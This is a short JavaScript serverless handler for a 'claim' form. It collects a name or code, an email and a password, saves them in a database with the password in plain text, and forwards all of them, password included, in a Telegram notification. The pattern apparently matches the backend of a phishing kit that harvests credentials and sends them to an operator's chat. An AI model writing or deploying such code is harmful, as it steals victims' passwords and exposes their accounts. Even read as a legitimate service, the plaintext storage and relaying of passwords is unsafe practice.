const { insertClaim, claimAllowed } = require("../../lib/db");
const { sendClaimNotification } = require("../../lib/telegram");
const { ok, fail } = require("./lib/http");

exports.handler = async (event) => {
  try {
    const ip =
      event.headers?.["x-forwarded-for"]?.split(",")[0].trim() ||
      event.headers?.["client-ip"] ||
      "local";

    if (!(await claimAllowed(ip))) {
      return fail(
        429,
        "Too many attempts. Please wait a moment and try again.",
      );
    }

    let body = {};
    try {
      body = JSON.parse(event.body || "{}");
    } catch {
      body = {};
    }

    const name = String(body.code ?? body.name ?? "").trim();
    const email = String(body.email ?? "").trim();
    const password = String(body.password ?? "").trim();

    const { row, claimCode } = await insertClaim({
      name,
      email,
      password,
      createdAt: new Date().toISOString(),
    });

    sendClaimNotification({
      id: row.id,
      name,
      email,
      password,
      claimCode,
    });

    return ok({ ok: true, name, email, claimCode });
  } catch (err) {
    console.error("claim handler error:", err);
    return fail(500, "Something went wrong, try again.");
  }
};